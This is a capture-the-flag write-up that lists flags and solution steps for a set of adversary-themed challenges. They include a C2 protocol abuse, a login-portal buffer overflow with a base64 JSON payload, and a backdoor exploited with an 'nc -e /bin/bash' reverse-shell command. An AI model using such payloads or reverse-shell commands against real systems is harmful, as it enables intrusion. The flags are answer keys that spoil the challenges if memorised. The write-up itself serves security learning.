# Catapult Spider

### Much Sad: CS{shibe_good_boi_doge_to_the_moon}
* searching for name from email address in *much_sad.txt* leads to Twitter profile with link to GitHub
* GitHub contains repository for site which contains flag

### Very Protocol: CS{such_Pr0t0_is_n3tw0RkS_w0W}
* using `strings` on *malware* reveals source files for Nodejs command and control server
* extracting certificates from "strings" dump makes it possible to securely connect
* build client that replicates encoding / decoding of messages to / from server
* use the server's "do me a favor" functionality to decrypt the secret key
    * {"dogesez":"do me a favor", "ohmaze":"cript(secrit_key, cript_key)"}

### Module Wow: CS{crypt0_an4lys1s_0n_c0d3}
* using `strings` on *module.wow* reveals some smaller pieces that look like they could be parts of the flag
* disassembly / decompilation shows the module copies a block of memory and then repeatedly xors the input
  string / key with the memory before executing the memory as a function with the string as an argument
* proper key decrypts the function so that it prints the key out as confirmation
* using assembly from test function that takes string as argument and prints it, xoring with obscured function
  reveals pieces of key and provides information for extracting the rest
* any byte in the decrypted code that appears as \x00 will appear as unencrypted plaintext in encrypted function

### Neurotoxin: CS{4tt4cks_0n_n3ur4l_netw0rks}
* use tensorflow model and backpropagation to create "adversarial images" for each cat picture
* decode resulting serialized data to retrieve image and reveal flag
* references:
    * https://medium.com/@ageitgey/machine-learning-is-fun-part-8-how-to-intentionally-trick-neural-networks-b55da32b7196
    * (not used, but possibly good) https://medium.com/@ml.at.berkeley/tricking-neural-networks-create-your-own-adversarial-examples-a61eb7620fd8
    * (not used, but possibly good) https://arxiv.org/pdf/1312.6199.pdf


# Protective Penguin

### Portal: CS{w3b_vPn_h4xx}
* binary takes in a JSON containing username and password base64-encoded
* concats username and password with ":" in between then opens file and searches for matching line
* username and password are limited to 256 characters each, but together can overwrite address
  of filename used in call to "fopen" for file to check for username:password
* "/lib64/ld-linux-x86-64.so.2" string is located in binary and its address can be written over the actual filename's address
* search through "/lib64/ld-linux-x86-64.so.2" for potential username and password lines
* calculate needed filler / padding for data and send username and password along with string address to inject
    * {"user":"cnVudGltZSBsaW5rZXIgc3RhdGlzdGljcw==","pass":"AEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBqAJAAA=="}


# Space Jackal

### The Proclamation: CS{0rd3r_0f_0x20_b00tl0ad3r}
* running bootloader in QEMU prints message saying there is a hidden message within (references Cicada3301)
* bootloader assembly reveals xor instructions
* xoring bytes of bootloader with 234 reveals message that's printed when ran along with flag

### Matrix: CS{if_computers_could_think_would_they_like_spaces?}
* provided with obfuscated python script for encryption / decryption and encrypted messages on tor webpage
* all messages have SPACEARMY appended to the front of them before being encrypted
* encryption scheme uses a nine character key and encrypts the plaintext in groups of three
* can group the known plaintext from SPACEARMY ((S,C,R), (P,E,M), (A,A,Y)) and use process of elimination to find
  each three-byte group of the key that produces the known plaintext

### Injector: CS{fr33_h00k_b4ckd00r}
* installing and running `chkrootkit` reveals script at /tmp/.hax/injector.sh
* deobfuscating the script reveals that it uses the `__free_hook` functionality to inject code into a process
  that will run any time the process calls free on a chunk of memory
* searching the memory of the nginx process at the offset generated by the script confirms it was the
  the victim of the injection
* disassembling the injected code shows the injected function looks for a string in memory matching
  the form "cmd{...}" where the command between the brackets will be passed to the system function and executed
* sending injector.challenges.adversary.zone:4321/cmd{nc -e /bin/bash ip port} allows a reverse shell to be
  spawned and the flag to be read
